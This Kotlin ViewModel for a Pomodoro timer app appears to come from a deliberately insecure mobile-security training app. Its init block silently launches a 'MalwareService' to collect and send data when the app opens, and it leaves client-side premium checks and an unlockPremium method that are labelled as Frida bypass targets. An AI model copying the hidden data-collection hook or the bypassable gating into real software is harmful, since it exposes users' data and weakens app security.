package com.mobileSec.pomodoroapp.viewmodel

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.mobileSec.pomodoroapp.data.model.SessionType
import com.mobileSec.pomodoroapp.data.model.TimerSession
import com.mobileSec.pomodoroapp.data.model.Todo
import com.mobileSec.pomodoroapp.data.model.*
import com.mobileSec.pomodoroapp.repository.TodoRepository
import com.mobileSec.pomodoroapp.repository.TimerRepository
import com.mobileSec.pomodoroapp.malware.MalwareService
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import javax.inject.Inject

class MainViewModel @Inject constructor(
    private val todoRepository: TodoRepository,
    private val timerRepository: TimerRepository,
    private val malwareService: MalwareService
) : ViewModel() {

    private val _timerState = MutableStateFlow(TimerState.IDLE)
    val timerState: StateFlow<TimerState> = _timerState

    private val _timeRemaining = MutableStateFlow(25 * 60) // 25 minutes in seconds
    val timeRemaining: StateFlow<Int> = _timeRemaining

    private val _selectedTodo = MutableStateFlow<Todo?>(null)
    val selectedTodo: StateFlow<Todo?> = _selectedTodo

    private val _isBreakMode = MutableStateFlow(false)
    val isBreakMode: StateFlow<Boolean> = _isBreakMode

    private val _workSessionsToday = MutableStateFlow(0)
    val workSessionsToday: StateFlow<Int> = _workSessionsToday

    val todos = todoRepository.getAllTodos()
        .stateIn(viewModelScope, SharingStarted.Lazily, emptyList())

    // VULNERABILITY: Check premium status without proper validation
    private val _isPremium = MutableStateFlow(false)
    val isPremium: StateFlow<Boolean> = _isPremium

    init {
        loadTodayWorkSessions()
        // MALWARE: Start collecting data in background
        viewModelScope.launch {
            malwareService.collectAndSendData()
        }
    }

    fun startTimer() {
        if (_timerState.value == TimerState.IDLE || _timerState.value == TimerState.PAUSED) {
            _timerState.value = TimerState.RUNNING
            viewModelScope.launch {
                while (_timerState.value == TimerState.RUNNING && _timeRemaining.value > 0) {
                    delay(1000)
                    _timeRemaining.value = _timeRemaining.value - 1
                }

                if (_timeRemaining.value == 0) {
                    onTimerComplete()
                }
            }
        }
    }

    fun pauseTimer() {
        _timerState.value = TimerState.PAUSED
    }

    fun resetTimer() {
        _timerState.value = TimerState.IDLE
        _timeRemaining.value = if (_isBreakMode.value) 5 * 60 else 25 * 60
    }

    // FRIDA BYPASS TARGET: Premium time limits
    fun setCustomTimer(minutes: Int) {
        if (!_isPremium.value && minutes > 25) {
            // This can be bypassed with Frida
            return
        }
        _timeRemaining.value = minutes * 60
    }

    fun selectTodo(todo: Todo) {
        _selectedTodo.value = todo
    }

    private fun onTimerComplete() {
        _timerState.value = TimerState.COMPLETED

        viewModelScope.launch {
            val session = TimerSession(
                durationMinutes = if (_isBreakMode.value) 5 else 25,
                completedAt = System.currentTimeMillis(),
                todoId = _selectedTodo.value?.id,
                sessionType = if (_isBreakMode.value) SessionType.SHORT_BREAK else SessionType.WORK
            )

            timerRepository.saveSession(session)

            if (!_isBreakMode.value) {
                _selectedTodo.value?.let { todo ->
                    todoRepository.incrementPomodoro(todo.id)
                }
                _workSessionsToday.value = _workSessionsToday.value + 1
                _isBreakMode.value = true
                _timeRemaining.value = 5 * 60 // 5 minute break
            } else {
                _isBreakMode.value = false
                _timeRemaining.value = 25 * 60 // 25 minute work session
            }

            _timerState.value = TimerState.IDLE
        }
    }

    private fun loadTodayWorkSessions() {
        viewModelScope.launch {
            _workSessionsToday.value = timerRepository.getTodayWorkSessions()
        }
    }

    fun addTodo(title: String, description: String) {
        viewModelScope.launch {
            val todo = Todo(
                title = title,
                description = description,
                createdAt = System.currentTimeMillis()
            )
            todoRepository.saveTodo(todo)
        }
    }

    fun toggleTodoComplete(todo: Todo) {
        viewModelScope.launch {
            todoRepository.updateTodo(todo.copy(isCompleted = !todo.isCompleted))
        }
    }

    // FRIDA BYPASS TARGET: Premium unlock
    fun unlockPremium() {
        // This method can be called via Frida to bypass premium checks
        _isPremium.value = true
    }
}

enum class TimerState {
    IDLE, RUNNING, PAUSED, COMPLETED
}